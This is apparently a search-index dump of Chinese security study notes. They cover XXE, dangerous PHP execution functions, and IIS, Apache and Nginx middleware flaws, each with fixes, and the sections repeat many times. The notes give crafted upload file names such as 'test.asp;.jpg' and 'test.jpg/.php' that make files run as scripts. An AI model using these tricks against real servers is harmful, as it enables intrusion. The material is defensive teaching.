1.原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 2.防御1、使用开发语言提供的禁用外部实体的方法。 2、PHP：libxml_disable_entity_loader(true); 3、过滤用户提交的XML数据 4、XML 解析库在调用时严格禁止对外部实体的解析 3.关键词：\u003c!DOCTYPE和\u003c!ENTITY，或者，SYSTEM和PUBLIC\r## 07-php命令执行\r#### 相关函数\r```\reval()\rassert\rpreg_replace()\rcreate_function()\rarray_map()\rcall_user_func()\rcall_user_func_array()\rarray_filter()\r```","date":"2023-11-17","objectID":"/hvv_owasptop10/:5:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#06-xxe"},{"categories":["hvv"],"content":"\r06-XXEXXE xml外部实体注入 1.原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 2.防御1、使用开发语言提供的禁用外部实体的方法。 2、PHP：libxml_disable_entity_loader(true); 3、过滤用户提交的XML数据 4、XML 解析库在调用时严格禁止对外部实体的解析 3.关键词：\u003c!DOCTYPE和\u003c!ENTITY，或者，SYSTEM和PUBLIC\r## 07-php命令执行\r#### 相关函数\r```\reval()\rassert\rpreg_replace()\rcreate_function()\rarray_map()\rcall_user_func()\rcall_user_func_array()\rarray_filter()\r```","date":"2023-11-17","objectID":"/hvv_owasptop10/:5:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理-4"},{"categories":["hvv"],"content":"\r06-XXEXXE xml外部实体注入 1.原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 2.防御1、使用开发语言提供的禁用外部实体的方法。 2、PHP：libxml_disable_entity_loader(true); 3、过滤用户提交的XML数据 4、XML 解析库在调用时严格禁止对外部实体的解析 3.关键词：\u003c!DOCTYPE和\u003c!ENTITY，或者，SYSTEM和PUBLIC\r## 07-php命令执行\r#### 相关函数\r```\reval()\rassert\rpreg_replace()\rcreate_function()\rarray_map()\rcall_user_func()\rcall_user_func_array()\rarray_filter()\r```","date":"2023-11-17","objectID":"/hvv_owasptop10/:5:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2防御-1"},{"categories":["hvv"],"content":"\r06-XXEXXE xml外部实体注入 1.原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 2.防御1、使用开发语言提供的禁用外部实体的方法。 2、PHP：libxml_disable_entity_loader(true); 3、过滤用户提交的XML数据 4、XML 解析库在调用时严格禁止对外部实体的解析 3.关键词：\u003c!DOCTYPE和\u003c!ENTITY，或者，SYSTEM和PUBLIC\r## 07-php命令执行\r#### 相关函数\r```\reval()\rassert\rpreg_replace()\rcreate_function()\rarray_map()\rcall_user_func()\rcall_user_func_array()\rarray_filter()\r```","date":"2023-11-17","objectID":"/hvv_owasptop10/:5:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3关键词"},{"categories":["hvv"],"content":"HVV专题–中间件漏洞 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:0:0","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#"},{"categories":["hvv"],"content":"\r中间件：中间件（Middleware）又称为web服务器或web容器，是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。 常见的web中间件： IIS Apache Tomcat Nginx Jboss Weblogic WebSphere ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:1:0","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#中间件"},{"categories":["hvv"],"content":"\r常见中间件漏洞：","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:0","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#常见中间件漏洞"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x1-iis"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1put漏洞"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2短文件名猜解"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#3远程代码执行"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#4解析漏洞"},{"categories":["hvv"],"content":"\r0x2 ApacheApache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。 1、解析漏洞Apache文件解析漏洞严格来说属于用户配置问题。 Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy yyy-\u003e无法识别，向左xxx-\u003e无法识别，向左 php-\u003e发现后缀是php，交给php处理这个文件 **修复方法：**将AddHandler application/x-httpd-php .php的配置文件删除。 2、目录遍历由于配置错误导致的目录遍历 修复方法： 修改apache配置文件httpd.conf 找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存； ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:2","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x2-apache"},{"categories":["hvv"],"content":"\r0x2 ApacheApache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。 1、解析漏洞Apache文件解析漏洞严格来说属于用户配置问题。 Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy yyy-\u003e无法识别，向左xxx-\u003e无法识别，向左 php-\u003e发现后缀是php，交给php处理这个文件 **修复方法：**将AddHandler application/x-httpd-php .php的配置文件删除。 2、目录遍历由于配置错误导致的目录遍历 修复方法： 修改apache配置文件httpd.conf 找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存； ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:2","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1解析漏洞"},{"categories":["hvv"],"content":"\r0x2 ApacheApache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。 1、解析漏洞Apache文件解析漏洞严格来说属于用户配置问题。 Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy yyy-\u003e无法识别，向左xxx-\u003e无法识别，向左 php-\u003e发现后缀是php，交给php处理这个文件 **修复方法：**将AddHandler application/x-httpd-php .php的配置文件删除。 2、目录遍历由于配置错误导致的目录遍历 修复方法： 修改apache配置文件httpd.conf 找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存； ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:2","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2目录遍历"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x3-nginx"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1文件解析"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2目录遍历-1"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#3crlf注入"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex 